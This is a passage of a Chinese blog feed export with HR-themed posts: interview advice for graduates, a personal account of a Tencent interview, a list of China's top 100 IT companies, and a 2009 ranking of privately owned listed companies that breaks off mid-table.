      <content type="html"><![CDATA[<p><strong>简历花哨还注水</strong></p><pre><code>“我真不知道现在的学生怎么想的，把简历搞这么花哨，这么夸大其词有什么好的。”开发区一家大型合资企业的人力资源总监刘旭伍表示，他收到的一些简历竟厚达二十多页，更有男生“附赠”Flash光盘，女生送艺术照、写真集的。简历上信息的“注水”问题，也或多或少反映了如今大学生的诚信问题——毕业论文还没写，简历里就已写“获得硕士学位”；同时兼任若干个民间组织的“主席”、“秘书长”；一位还没毕业的计算机专业本科生，竟自称当过某公司的“技术总监”，仔细一问才知道那是一家只有六个人的作坊小厂。</code></pre><p><strong>“投霸”一问三不知</strong></p><pre><code>令用人单位烦恼不已的，还有大学生“广撒网”、“地毯式”的投简历方法。这类“投霸”在被问及对应聘单位或应聘职位有什么了解时，给出的回答大多是避实就虚的答案。更有甚者，很“诚实”地告诉面试官，“我投的简历太多了，投的什么职位自己也忘了”。</code></pre><p><strong>面试频频遇家长</strong></p><pre><code>“我这哪是招员工啊，简直就像是幼儿园招生，好多学生都是带着几名家长来面试。”回忆起上周的一次面试过程，天津金一国际贸易有限公司人力资源部赵天海部长哭笑不得地说。今年不少公司面试不得不采取“封闭式”，就是因为很多家长的过度干预。有的家长做得很“到位”，一直等到下班，拦住面试考官拉关系。“我们家孩子倍儿老实，不会说话，可他很优秀、很懂事、很努力……”、“经理啊，我们想请您吃个饭，表表心意……”</code></pre><p><strong>过好面试关专家支三招儿</strong></p><p><strong>先给考官“相相面”</strong></p><pre><code>怎样尽可能给考官留下好印象呢？南开大学就业指导中心主任刘月波说，不妨从一进门开始，利用短短几分钟给你的考官“相相面”。一般坐在中间的面试官是有决定权的。从面试官的衣着打扮、年龄性别、办公室布置、待人接物等方面获得直观信息，大致判断他的性格喜好。刘主任提醒面试者，不妨把考官当作我们生活中的朋友，放松心情。“如果你正在侃侃而谈时，面试官的目光已经转向别处，或者隐隐流露出不耐烦，那么你不如适当缩短你的发言时间，多留点时间给对方提出下一个问题。”</code></pre><p><strong>自我介绍：1＋1＋1</strong></p><pre><code>如何在自我介绍时给考官留下深刻的印象？刘月波将自我介绍概括为3个话题：“我是谁”、“你是谁”和“我找你做什么”。首先，用最简单的话说明白自己的姓名、学校和专业等；第二，简要介绍你所了解到的该公司的基本信息；第三，用最简单的言语表达自己愿意成为该公司的一员，并为公司带来效益，使自己获得发展。不少人容易走进误区，要么大段大段地介绍自己获过哪些奖、参加过哪些课外实践，要么激动万分地演讲开来，更有甚者还采用唱歌等表演方式来展示自己的文艺特长，这些都大可不必。</code></pre><p><strong>陈词不需太过“激昂”</strong></p><pre><code>在如今流行的“群面”阵势里，十几名甚至几十名应聘者，按照划分好的小组，针对相关话题展开讨论。刘月波认为这往往是展示应聘同学个人才能和思路的重要时机。“不要不说话，我们可以准确精炼、平和从容地阐述自己的观点。当讨论时撞击出思想的火花时，也可以充分表达与众不同的见解，但不要为了引人注目作无谓的争辩，甚或狡辩。无论是企业还是事业单位，对应聘者团队意识和合作能力越来越重视，锋芒毕露有可能让大家反感。”</code></pre>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>曝光腾讯面试全记录</title>
      <link href="/2009/12/11/expose-tencent-interview-full-record/"/>
      <url>/2009/12/11/expose-tencent-interview-full-record/</url>
      <content type="html"><![CDATA[<p>大概在四月份的时候去腾讯(成都)参加了面试，整个面试过程有很多东西值得推敲，一直有想要写出来和大家分享，但是一直觉得没有足够的沉淀或者是没有办法写出自己想要表达的东西，在这里需要感谢小白羊同学的鼎力推荐和支持，感谢腾讯成都的黄MM，感谢Gloria给我面试的机会，感谢负责我二面的两位腾讯HR。</p><pre><code>首先对于有志于希望进入腾讯的朋友，我建议大家经常关注腾讯社会招聘，这是一个腾讯招聘信息的发布平台，当然多种招聘渠道是独立的(猎头、内部推荐、常规招聘)，但是几乎所有的招聘职位都会在这里发布信息，在这里可以快速提交自己的简历。</code></pre><p>　　因为腾讯在2009年加快了在成都地区的扩张速度，所以我偶尔也会有去关注腾讯的招聘信息。我当时比较关注的职位是，我的理解会像是“雅虎搜索质量监控小组”差不多的工作内容，因为事实上我之前有仔细对比过多个搜索引擎的搜索结果，虽然腾讯旗下搜搜号称搜索数据来自Google，但是仍然会对排名进行微调，这部分的工作应该就是由他们招聘的这个职位来做，工作会有点枯燥，但是仍然不失为一个好的锻炼机会。</p><p>　　尽管如此，我当时仍然仅仅是关注而已，因为个人感觉腾讯发布的招聘信息多半是竞争激烈，巧的是之前的同事小白羊同学现在蹦达到了腾讯，而且恰好也在这个部门，问我需不需要内部推荐。有机会当然不要放过，在把简历发出去之后等面试通知的同时开始作一些准备。</p><p>　　Tips：互联网企业的招聘通常内部推荐的成功率比较高，一般能够能够直接得到面试机会，避开了淘汰率最高的简历初选。</p><p>　　复习一些关于搜索引擎的一些常识，同时仔细了解腾讯旗下搜索品牌搜搜的产品布局，了解产品的近况。</p><p>　　简历精简到一页纸以内，剪了头发让自己看起来更精神，同时最重要的一点是去了解腾讯的面试流程和常见的一些问题，这些大家可以在网上搜索一下，了解下别人的面试经历，对自己也会比较有启发。</p><p>　　Tips：面试前的准备很重要，不仅包括硬实力(简历、仪容)，还包括软实力(公司职位信息、产品信息、面试流程和常见问题的回答)的提升。</p><p><strong>　　四月一号，发放简历</strong></p><p>　　发出了简历，因为是直接发给部门主管，所以在邮件里面阐述了一些对于腾讯产品的看法以及自己为什么想要进入腾讯和得到这份工作，邮件的内容可以诚恳一点的基础上适当表达自己的想法。</p><p><strong>　　四月二号，收到面试通知</strong></p><p>　　第二天就收到了HR发来的短信通知我四月八号下午面试，没有同时也用邮件通知。感觉他们这点做得有点问题，假设我恰好那天手机停机，那不就收不到消息，囧。短信内容还算是详细，面试时间、地点、注意事项、公交换乘信息一应俱全。</p><p>　　根据从小白羊同学处刺探到的信息，一面的主要是笔试和一些简单的问答，自己选择性地进行了一些准备，这个部分其实没有太多东西需要做的，因为本身个人就比较关注业界和搜索引擎比较多，大家在面试前可以有选择性地进行强化。</p><p><strong>四月八号，面试</strong></p><p>　　因为今天是一面的关系，提前请了一天假，虽然面试是在下午，但是还是很早就起来了，把简历、口香糖一些有的没有的东西都准备完毕，查了详细的公交换乘线路。</p><p>　　另外绿箭绝对是面试的好搭档，除了可以让你保持口气清新外，脸部肌肉的咀嚼可以充分舒缓自己紧张的情绪。</p><p>　　我到达腾讯的时候是下午两点，面试通知的时间是两点半。一走到门口，帅气高达的保安哥哥就把我引到前台MM那边签到，腾讯成都的前台MM个子好像都不矮的样子，蛮PP。</p><p>　　因为约定的时间还没有到，所以前台MM把我带到背后的休息区，已经有一个MM已经先我到了。反正没事儿就随便攀谈了几句，后面又陆陆续续来了几位一起来面试的朋友，看我和那MM谈的火热还以为我们俩是认识，笑。</p><p>　　过了一会儿，HR MM把我们带到三楼的会议室，开始一个小时的笔试。之前有了解过腾讯的笔试题一部分和公务员的行政能力测试有点类似。</p><pre><code>笔试的内容主要包括三个部分：一个部分是逻辑思维能力测试，主要是一些数字找规律的题，大家可以针对性地找行政能力测试的题瞅瞅，不会有差很多;一个部分是搜索引擎优化的常识，都不太复杂，一些简单的常识;最后一个部分可能是与工作相关度比较高的，主要是关于搜索引擎分词、分类以及一些通配符，都不太难，只是理解上会花一定的时间。</code></pre><p>　　我大概四十分钟做完，必须要承认的是逻辑思维能力部分的题有一部分是想不出来胡乱猜的，其他两个部分的题难度都还好，不过事后小白羊帮我问的笔试成绩是不太好，不知道是不是自我感觉太良好，囧。</p><p>　　因为还有一段时间的空闲，所以我就中途出去上厕所，腾讯的厕所墙壁上面都会有贴一些短小的笑话，让人心情愉快，这也算是腾讯文化中的一部分吧。回来的时候我看一认真工作的MM，以为是小白羊同学，所以敲了一下桌子，一抬头就发现认错人，只好说了声Sorry落荒而逃，我在这里对打搅那位MM的工作真诚地说声对不起。</p><p>　　回来会议室不长的时间里大家都完成了，这时候Gloria也进来了，先提了一个问题：大家有谁知道我们这个职位是做什么的？</p><p>　　其实这个问题算是蛮简单的，不过另外一个MM让我大跌眼镜，她回答是网站内容编辑，估计这个MM功课有做比较少，可能都不知道腾讯旗下有个搜索品牌叫做搜搜，我的回答是这个职位是致力于腾讯旗下搜搜的搜索结果的评测和改进，看起来Gloria好像还算满意。</p><p>　　一面的第二个部分就是让大家十分钟集体讨论，主题是一个博客怎样进行搜索引擎优化可以获取更好的排名。</p><p>　　这个部分的状况比较混乱，实际的状况就是都比较想要表现自己，但是又提不出太实质性的东西。我提了独立空间、Wordpress、独立域名、站内链接、付费链接、站群，如果要我给自己打分的话只能够打到50分，主要是临时team的协作能力不够，而这个讨论的重点就是看大家的协作能力。一个MM主动做笔记，这种情况如果你不是很突出，甘当绿叶是一种不错的选择。</p><p>　　最后就是收了大家的简历让大家回去等通知，顺便说下Gloria是一个很亲和的人，下电梯的时候遇见小白羊同学，她还是一如既往地瘦(应该多多滋补下)。这时候我才知道那个做笔记的MM也是她朋友，大家交谈了一下就各自回家。那个MM是乐山的，需要当天赶回去加班，我还害别人公交坐过站(囧)。</p><p>　　一面的总结个人感觉是还好，过得希望比较大，在下一周收到了四月十七号进行二面的通知，二面是我难以忘记的伤痛，一面奇好，二面奇差是我个人对这次面试的总结。</p><p>　　Tips：尽量把时间掐算好，最好是提前二十分钟到会比较好，不会让别人觉得比较窘迫，你也会有足够的时间适应环境和调适心情;准备多条公交换乘线路和多种后备方案，有备无患;如果有机会可以和一起面试的朋友交谈一下，可以有效舒缓压力。</p><p><strong>四月十七号。复试</strong></p><p>　　轻敌是我二面失利的重要原因，在我的潜意识里会认为说一面是主要的，HR面可能只是作为参考意见，尽管事前知道是北京成都两地HR联合面试这种想法依然没有太大的改观。</p><p>　　我还是在差不多的时间到达腾讯，我没有做到很好的审时度势，事实上的状况是面试已经开始，就在距离我不远的一个小间，我都可以听到问答的声音。但是我没有联想到那里就是我进行HR面的地方，并且我也完全没有发现HR面随时可能开始，这为后面的惊慌失措埋下伏笔。</p><p>　　过了一会儿前台MM带我过去那个小间，两位HR一男一女正襟危坐，会给人点压力。他们先作了自我介绍，然后我把简历交给他们，他们问了几个问题，而且都是步步紧逼那种。</p><p>　　先大概问了下我离开之前公司的原因和现在的状况，然后问到你从一个副理的到腾讯做一个普通的搜索引擎评测专员，能不能向我们说一下原因，我的回答大概就是因为之前的工作也是与搜索引擎有关的，并且腾讯的一些工作流程和企业文化是值得我来学习的。</p><p>　　说实话这样的回答连我自己都不满意，不过这还不算糟糕的，只是噩梦的开始而已。</p><p>　　他们问说你毕业应该不久，假设你寝室的室友有ABCDE，请分别表述你对他们的评价。听到这个问题我就懵了，因为确实没有想到会是这样的问题，就算是平时我们也会很难去一个个表述清楚吧，这个问题对个人的口头表达能力和思维反应能力是很大考验。我的回答超级含糊的，我自己都可以感觉这份offer正在逐渐离我远去。什么？你觉得这样已经够了？不对还没完，下一个问题会更让你崩溃的。</p><p>　　他们后续的一个问题就是，假设你寝室的室友有ABCDE，请分别表述他们对你的评价。My God!我的脑袋瞬间脱线，怎么回答的都不知道，肯定超级糟糕。</p><p>　　然后是我有没有什么需要问他们的，我询问了一些关于腾讯怎样应对低龄化的问题，以及腾讯最近的口碑产品战略。他们进行了一个简单的回答，很官方的回答。</p><p>　　后面的就很简单了，感谢我参加这次面试，脑袋昏昏沉沉的，只有出来的时候风吹过才有让我更清醒一点。</p><p>　　面试终结，我自己大概都可以猜到结果，后面小白羊帮我问的结果就是被Fire，简历进入人才库。</p><p>　　这次面试的体会更多是千万不要轻视HR面，越是大公司越是如此，他们的思维是选择优秀的人，但是优秀的人和技术优秀是两个概念，他们有一套完善的人事模型。大概看了一下，写了三千多字，很久没有写这么长的东西了，希望大家会有借鉴的地方</p><p>　　另外最后要和Gloria说声Sorry，我在四月二十六号的时候才想起写感谢信，也许她自己并不在意，但是我个人会感觉这是一种很失礼的行为，So terrible，再次感谢她给我这次面试机会。</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>中国排名前100的IT公司</title>
      <link href="/2009/12/11/china-s-top-100-it-companies/"/>
      <url>/2009/12/11/china-s-top-100-it-companies/</url>
      <content type="html"><![CDATA[<p>排序 单位名称 软件收入<br>1 华为技术有限公司 622360<br>2 中兴通讯股份有限公司 601331<br>3 海信集团有限公司 448641<br>4 UT斯达康通讯有限公司 386763<br>5 海尔集团公司 333664<br>6 神州数码(中国)有限公司 311862<br>7 浙江浙大网新科技股份有限公司 288781<br>8 熊猫电子集团有限公司 233572<br>9 浪潮集团有限公司 181046<br>10 东软集团有限公司 174196<br>11 北京北大方正集团 171711<br>12 微软(中国)有限公司 163313<br>13 朝华科技(集团)股份有限公司 155943<br>14 中国计算机软件与技术服务总公司 139890<br>15 清华同方股份有限公司 135305<br>16 上海贝尔阿尔卡特股份有限公司 119854<br>17 山东中创软件工程股份有限公司 116018<br>18 国际商业机器(中国)有限公司(IBM) 114000<br>19 大唐电信科技股份有限公司(北京) 112035<br>20 摩托罗拉(中国)电子有限公司 105614<br>21 上海宝信软件股份有限公司 96472<br>22 托普集团科技发展有限责任公司 95271<br>23 中国民航信息网络股份有限公司 89362<br>24 北京用友软件股份有限公司 73100<br>25 中国长城计算机集团公司 69715<br>26 北京四方继保自动化有限公司 67849<br>27 烟台东方电子信息产业集团有限公司 67144<br>28 北京甲骨文软件系统有限公司 66275<br>29 南京联创科技股份有限公司 62000<br>30 金蝶软件(中国)有限公司 57782<br>31 南京南瑞集团公司 54877<br>32 杭州恒生电子集团有限公司 46010<br>33 上海新华控制技术(集团)有限公司 45712<br>34 新太科技股份有限公司 41832<br>35 思爱普(北京)软件系统有限公司 40813<br>36 哈尔滨亿阳信通股份公司 40708<br>37 云南南天电子信息产业股份公司 39892<br>38 杭州新中大软件股份公司 39500<br>39 株洲时代集团公司 39316<br>40 南京南瑞继保电气有限公司 38483<br>41 江苏南大苏富特软件股份有限公司 37813<br>42 创智集团 37400<br>43 深圳市南凌科技发展有限公司 34724<br>44 北京握奇数据系统有限公司 33547<br>45 毕益辉系统(中国)有限公司(BEA) 33000<br>46 华立集团有限公司 32029<br>47 广州华南资讯科技有限公司 31995<br>48 杭州士兰微电子股份有限公司 31329<br>49 浙江中控科技集团有限公司 30622<br>50 盛趣信息技术(上海)有限公司 30461<br>51 长春一汽启明信息技术有限公司 30152<br>52 湖南计算机集团 28794<br>53 华北计算机系统工程研究所 28794<br>54 深圳迈瑞生物医疗电子股份有限公司 27000<br>55 福建星网锐捷通讯有限公司 26922<br>56 广州海格通信有限公司 26551<br>57 京华网络有限公司 26360<br>58 北京市和利时系统工程股份有限公司 26353<br>59 长江计算机(集团)公司(上海) 25329<br>60 太极计算机集团(北京) 24554<br>61 江苏东大金智软件股份有限公司 24206<br>62 杭州信雅达系统工程股份有限公司 24165<br>63 上海达因信息技术股份有限公司 23848<br>64 湖南长沙新宇科技发展有限公司 23600<br>65 北京联想软件有限公司 23196<br>66 深圳市金证科技股份有限公司 22753<br>67 中程科技有限公司 22451<br>68 大恒新纪元科技股份有限公司 22368<br>69 沈阳先锋计算机工程有限公司 21475<br>70 福建新大陆电脑股份有限公司 21342<br>71 上海致达信息产业股份有限公司 21050<br>72 福建榕基软件开发有限公司 20705<br>73 宏智科技股份有限公司 20530<br>74 海湾安全技术股份有限公司 20411<br>75 亚信科技(中国)有限公司 20126<br>76 上海复旦光华信息科技股份有限公司 20111<br>77 北京天桥北大青鸟科技股份有限公司 19913<br>78 掌中万维中国信息科技有限公司 18807<br>79 九娱(上海)信息技术有限公司 18746<br>80 四川汇源科技发展股份公司 17857<br>81 北京东华合创数码科技股份有限公司 17718<br>82 华迪计算机有限公司 17610<br>83 北京朗新信息系统有限公司 17243<br>84 北京中科大洋科技发展股份有限公司 17137<br>85 深圳市现代计算机有限公司 16903<br>86 北京新晨科技股份有限公司 16813<br>87 南昌先锋软件股份有限公司 16790<br>88 湖南国讯国际网络有限公司 16605<br>89 大连华信计算机技术有限公司 16404<br>90 建研科技股份有限公司 16345<br>91 中科软科技股份有限公司 16169<br>92 南望信息产业集团有限公司 16059<br>93 赛贝斯软件(中国)有限公司 16044<br>94 四川托日信息工程有限责任公司 15666<br>95 国电南瑞科技股份有限公司 15454<br>96 北京先进数通信息技术有限公司 15362<br>97 万达信息股份有限公司 15254<br>98 杭州颐和科技信息系统有限公司 15020<br>99 黎明网络有限公司 14976<br>100 浙江大华信息技术股份有限公司 14896</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>中国民营上市企业百强榜出炉 平安位列榜首</title>
      <link href="/2009/12/11/the-list-of-top-100-privately-listed-chinese-companies-topped-the-list/"/>
      <url>/2009/12/11/the-list-of-top-100-privately-listed-chinese-companies-topped-the-list/</url>
      <content type="html"><![CDATA[<p>网易财经9月23日讯中欧国际工商学院携手Wind资讯今天在上海推出2009年中国上市民营企业百强排行榜，该榜单已经是连续第6年发布。 中国平安、 苏宁电器位列前两位，去年排名的第一的国美电器退居第三位。</p><p>中欧中国民营企业研究中心发布了最新版的《2009中国民营上市企业绩效报告》，对民营经济的整体情况进行了总结，对民营企业应对市场变化提供了建议。</p><p><strong>金融危机下成长速度降幅不大</strong></p><p>受全球金融危机及出口需求下滑影响，2008年中国经济增长速度在下半年出现了明显的回调。即使在这样非常不利的环境下，中国私营企业仍保持了稳定增长态势，为中国经济抵御危机、保持平稳增长做出了重要贡献。民营上市企业成长速度虽然减慢，但降幅不大。2008年，民营上市企业总营业收入达到19233.33亿元，平均营业收入为22.11亿元，与2007年相比均有一定增长。企业平均营业收入增长率达到33.68%，与2007年相比下降了18.78个百分点。从净利润来看，净利润总额为1274.29亿元，平均净利润为1.46亿元，净资产收益率为6.85%，均有所下降。</p><p>从数据上看，民营上市企业和A股非民营上市企业的盈利状况都受到了外部环境恶化和宏观经济紧缩的不利影响，不过，在减少这一负面影响方面民营企业较非民营企业的成效更为明显。</p><p>在社会贡献方面，与2007年相比有一定增长。2008年，民营上市企业工资与税收支出总额为1143.27亿元（由于缺乏数据，该项数值不包括在香港和美国上市的民营企业），平均每家企业工资与税收支出额为1.81亿元，高于2007年946.18亿元、1.50亿元。根据2009年5月29日的收盘价，民营上市企业的总市值为40376.51亿元，平均市值为50.92亿元。</p><p><strong>增长率和盈利能力超过国有上市公司</strong></p><p>和A股非民营上市公司比较，虽然民营企业规模较小，但在增长率和盈利能力方面却超过了国有企业。从营业收入增长率来看，2008年民营上市企业的增长率高达33.68%，高于非民营上市企业的增长率18.74%。从平均总资产收益率来看，民营上市企业为4.37%，而同期非民营上市企业仅为2.48%。在净资产收益率方面，民营同样高于非民营，民营上市企业的平均净资产收益率为6.85%，非民营上市企业的平均数为4.90%。</p><p><strong>民营上市企业应做强而非做大</strong></p><p>中欧国际工商学院副院长兼中方教务长张维炯教授表达了三个观点，他说，毋庸置疑，民营“经济部”门已经成为中国经济持续平稳增长的重要引擎之一。在当前的形势下，中国的民营企业要追求的是做强，而非做大，企业要提高运营效率，以最少的资源为社会创造财富；其次，中国的民营企业要提高竞争能力，参与国际竞争；第三，中国的民营企业要承担更多的社会责任。</p><p>针对新推出的创业板，张维炯教授表示，中国的民营企业发展碰到了很多问题，创业板对解决民营企业融资能起到一定促进作用，它提供了筹资的平台，同时还能帮助民营企业更加规范运作，使我国多层次资本市场向前迈出重要的一大步。</p><p><strong>大型民企更倾向于选择海外上市</strong></p><p>除了在台湾上市之外，中国的民营企业也越来越多的选择在海外上市，报告指出，从规模来看，海外上市的民企高于内地上市民企。从营业收入总额来看，海外上市民企为7222.14亿元，内地上市民企为12011.18亿元，这与内地上市民企数量更多有关系。从平均营业收入来看，海外上市民企为30.47亿元，远高于内地上市民企的18.98亿元。从平均营业收入增长率来看，海外上市民企也远高于内地上市民企，分别为51.25%，27.03%（见表5）。以上分析表明，规模大、盈利能力强的民企更倾向于选择海外上市，而海外上市反过来又对这些企业的进一步发展带来了明显的促进作用。这说明，海外上市民企是中国民营部门中的佼佼者，也是其他民营企业的发展标杆。</p><p><strong>创业板对纳斯达克影响不大</strong></p><p>纳斯达克中国区代表夏国雄表示，目前，纳斯达克的中国上市公司超过了100家，纳斯达克已经成长为上市公司数量最多、交易量最大的美国最大的交易所。虽然去年受金融危机的影响蛮大，IPO的速度放缓，但今年下半年的情况会有所好转。纳斯达克并非是只接纳中小型公司的市场，创业板推出不会对纳斯达克市场有很大的影响。</p><p>据了解，中欧此次评选在界定民营企业上，把所有非国有的农村和城镇经济实体，主要包括私营企业、集体所有企业、私人股东或集体股东控股的股份制企业，甚至包括外商投资企业（含港澳台资企业），都界定为民营企业。在此基础上，本报告把中国民营上市企业界定为经营活动主要发生在大陆境内的所有非国有控股的上市公司。</p><p>根据这一标准，评选确认2008年在台湾和香港、美国证券市场上市的民营企业共有893家，其中在我国上海和深圳证券交易所上市的有636家，在香港特区联交所上市的有175家，在美国纳斯达克和纽约证券交易所上市的共82 家。</p><p><strong>附：排行榜前十强：</strong></p><p>排名股票代码 公司简称 上市地点 行业 2008年营业收入（亿元）</p><p>1601318.SH 中国平安 上海 金融、保险业 1398.03</p><p>2002024.SZ 苏宁电器 深圳 批发和零售贸易 498.97</p><p>30493.HK 国美电器 中国香港 批发和零售贸易 458.89</p><p>4000527.SZ 美的电器 深圳 制造业 453.13</p><p>50656.HK 复星国际 中国香港 制造业 402.50</p><p>6600016.SH 民生银行 上海 金融、保险业 350.17</p><p>7600690.SH 青岛海尔 上海 制造业 304.08</p><p>80322.HK 康师傅控股 中国香港 制造业 291.98</p><p>9600282.SH 南钢股份 上海 制造业 283.54</p><p>101211.HK 比亚迪股份 中国香港 制造业 267.88</p><p>排名</p><p>股票代码</p><p>公司简称</p><p>上市地点</p><p>行业</p><p>2008年营业收入（亿元）</p><p>1</p><p>601318.SH</p><p>中国平安</p><p>上海</p><p>金融、保险业</p><p>1398.03</p><p>2</p><p>002024.SZ</p><p>苏宁电器</p><p>深圳</p><p>批发和零售贸易</p><p>498.97</p><p>3</p><p>0493.HK</p><p>国美电器</p><p>中国香港</p><p>批发和零售贸易</p><p>458.89</p><p>4</p><p>000527.SZ</p><p>美的电器</p><p>深圳</p><p>制造业</p><p>453.13</p><p>5</p><p>0656.HK</p><p>复星国际</p><p>中国香港</p><p>制造业</p><p>402.50</p><p>6</p><p>600016.SH</p><p>民生银行</p><p>上海</p><p>金融、保险业</p><p>350.17</p><p>7</p><p>600690.SH</p><p>青岛海尔</p><p>上海</p><p>制造业</p><p>304.08</p><p>8</p><p>0322.HK</p><p>康师傅控股</p><p>中国香港</p><p>制造业</p><p>291.98</p><p>9</p><p>600282.SH</p><p>南钢股份</p><p>上海</p><p>制造业</p><p>283.54</p><p>10</p><p>1211.HK</p><p>比亚迪股份</p><p>中国香港</p><p>制造业</p><p>267.88</p><p>11</p><p>000895.SZ</p><p>双汇发展</p><p>深圳</p><p>制造业</p><p>260.10</p><p>12</p><p>2319.HK</p><p>蒙牛乳业</p><p>中国香港</p><p>制造业</p><p>238.65</p><p>13</p><p>0581.HK</p><p>中国东方集团</p><p>中国香港</p><p>综合类</p><p>193.88</p><p>14</p><p>1880.HK</p><p>百丽国际</p><p>中国香港</p><p>批发和零售贸易</p><p>178.56</p><p>15</p><p>2007.HK</p><p>碧桂园</p><p>中国香港</p><p>房地产</p><p>157.13</p><p>16</p><p>2777.HK</p><p>富力地产</p><p>中国香港</p><p>房地产</p><p>153.60</p><p>17</p><p>000001.SZ</p><p>深发展</p><p>深圳</p><p>金融、保险业</p><p>145.13</p><p>18</p><p>600031.SH</p><p>三一重工</p><p>上海</p><p>制造业</p><p>137.45</p><p>19</p><p>0751.HK</p><p>创维数码</p><p>中国香港</p><p>制造业</p><p>135.21</p><p>20</p><p>STP</p><p>尚德电力</p><p>美国</p><p>制造业</p><p>131.46</p><p>21</p><p>600089.SH</p><p>特变电工</p><p>上海</p><p>制造业</p><p>125.19</p><p>22</p><p>600006.SH</p><p>东风汽车</p><p>上海</p><p>制造业</p><p>124.31</p><p>23</p><p>1068.HK</p><p>雨润食品</p><p>中国香港</p><p>制造业</p><p>114.86</p><p>24</p><p>1333.HK</p><p>中国忠旺</p><p>中国香港</p><p>制造业</p><p>112.64</p><p>25</p><p>LDK</p><p>江西赛维</p><p>美国</p><p>制造业</p><p>112.33</p><p>26</p><p>600177.SH</p><p>雅戈尔</p><p>上海</p><p>制造业</p><p>107.80</p><p>27</p><p>0151.HK</p><p>中国旺旺</p><p>中国香港</p><p>制造业</p><p>106.20</p><p>28</p><p>600438.SH</p><p>通威股份</p><p>上海</p><p>农、林、牧、渔业</p><p>103.03</p><p>29</p><p>1169.HK</p><p>海尔电器</p><p>中国香港</p><p>制造业</p><p>100.62</p><p>30</p><p>600295.SH</p><p>鄂尔多斯</p><p>上海</p><p>制造业</p><p>95.20</p><p>31</p><p>0754.HK</p><p>合生创展集团</p><p>中国香港</p><p>房地产业</p><p>95.02</p><p>32</p><p>2355.HK</p><p>宝业集团</p><p>中国香港</p><p>建筑业</p><p>93.57</p><p>33</p><p>3383.HK</p><p>雅居乐地产</p><p>中国香港</p><p>房地产业</p><p>93.26</p><p>34</p><p>3999.HK</p><p>大成食品</p><p>中国香港</p><p>制造业</p><p>88.44</p><p>35</p><p>8277.HK</p><p>物美商业</p><p>中国香港</p><p>批发和零售贸易</p><p>87.59</p><p>36</p><p>600066.SH</p><p>宇通客车</p><p>上海</p><p>制造业</p><p>83.36</p><p>37</p><p>2688.HK</p><p>新奥燃气</p><p>中国香港</p><p>公用事业</p><p>82.66</p><p>38</p><p>600122.SH</p><p>宏图高科</p><p>上海</p><p>信息技术业</p><p>82.42</p><p>39</p><p>2333.HK</p><p>长城汽车</p><p>中国香港</p><p>制造业</p><p>82.11</p><p>40</p><p>002203.SZ</p><p>海亮股份</p><p>深圳</p><p>制造业</p><p>79.06</p><p>41</p><p>600655.SH</p><p>豫园商城</p><p>上海</p><p>批发和零售贸易</p><p>78.56</p><p>42</p><p>0809.HK</p><p>大成生化科技</p><p>中国香港</p><p>制造业</p><p>77.69</p><p>43</p><p>YGE</p><p>英利</p><p>美国</p><p>制造业</p><p>75.53</p><p>44</p><p>600491.SH</p><p>龙元建设</p><p>上海</p><p>建筑业</p><p>72.87</p><p>45</p><p>000876.SZ</p><p>新希望</p><p>深圳</p><p>制造业</p><p>72.63</p><p>46</p><p>600219.SH</p><p>南山铝业</p><p>上海</p><p>制造业</p><p>72.32</p><p>47</p><p>600596.SH</p><p>新安股份</p><p>上海</p><p>制造业</p><p>72.19</p><p>48</p><p>0813.HK</p><p>世茂房地产</p><p>中国香港</p><p>房地产业</p><p>71.96</p><p>49</p><p>600143.SH</p><p>金发科技</p><p>上海</p><p>制造业</p><p>71.68</p><p>50</p><p>0700.HK</p><p>腾讯控股</p><p>中国香港</p><p>信息技术</p><p>71.55</p><p>51</p><p>0691.HK</p><p>山水水泥</p><p>中国香港</p><p>制造业</p><p>70.76</p><p>52</p><p>1044.HK</p><p>恒安国际</p><p>中国香港</p><p>制造业</p><p>70.56</p><p>53</p><p>1192.HK</p><p>泰山石化</p><p>中国香港</p><p>制造业</p><p>68.90</p><p>54</p><p>2331.HK</p><p>李宁</p><p>中国香港</p><p>制造业</p><p>66.90</p><p>55</p><p>3900.HK</p><p>绿城中国</p><p>中国香港</p><p>房地产业</p><p>66.35</p><p>56</p><p>3813.HK</p><p>宝胜国际</p><p>中国香港</p><p>制造业</p><p>65.42</p><p>57</p><p>600595.SH</p><p>中孚实业</p><p>上海</p><p>制造业</p><p>64.71</p><p>58</p><p>600408.SH</p><p>安泰集团</p><p>上海</p><p>制造业</p><p>63.78</p><p>59</p><p>600801.SH</p><p>华新水泥</p><p>上海</p><p>制造业</p><p>63.49</p><p>60</p><p>WH</p><p>无锡西姆莱斯</p><p>美国</p><p>制造业</p><p>62.34</p><p>61</p><p>3339.HK</p><p>中国龙工</p><p>中国香港</p><p>制造业</p><p>61.45</p><p>62</p><p>000572.SZ</p><p>海马股份</p><p>深圳</p><p>综合类</p><p>61.26</p><p>63</p><p>600308.SH</p><p>华泰股份</p><p>上海</p><p>制造业</p><p>60.06</p><p>64</p><p>002082.SZ</p><p>栋梁新材</p><p>深圳</p><p>制造业</p><p>58.36</p><p>65</p><p>002078.SZ</p><p>太阳纸业</p><p>深圳</p><p>制造业</p><p>57.99</p><p>66</p><p>600660.SH</p><p>福耀玻璃</p><p>上海</p><p>制造业</p><p>57.17</p><p>67</p><p>000910.SZ</p><p>大亚科技</p><p>深圳</p><p>制造业</p><p>57.13</p><p>68</p><p>TSL</p><p>常州天合光能</p><p>美国</p><p>制造业</p><p>56.86</p><p>69</p><p>3389.HK</p><p>新宇亨得利</p><p>中国香港</p><p>批发和零售贸易</p><p>55.16</p><p>70</p><p>002251.SZ</p><p>步步高</p><p>深圳</p><p>批发和零售贸易</p><p>52.01</p><p>71</p><p>600210.SH</p><p>紫江企业</p><p>上海</p><p>制造业</p><p>50.77</p><p>72</p><p>600577.SH</p><p>精达股份</p><p>上海</p><p>制造业</p><p>50.53</p><p>73</p><p>SOLF</p><p>江苏林洋</p><p>美国</p><p>信息技术</p><p>49.49</p><p>74</p><p>600611.SH</p><p>大众交通</p><p>上海</p><p>社会服务业</p><p>48.84</p><p>75</p><p>000559.SZ</p><p>万向钱潮</p><p>深圳</p><p>制造业</p><p>48.48</p><p>76</p><p>600246.SH</p><p>万通地产</p><p>上海</p><p>房地产</p><p>48.41</p><p>77</p><p>2313.HK</p><p>申洲国际</p><p>中国香港</p><p>制造业</p><p>48.23</p><p>78</p><p>CSIQ</p><p>阿特斯</p><p>美国</p><p>制造业</p><p>48.18</p><p>79</p><p>002062.SZ</p><p>宏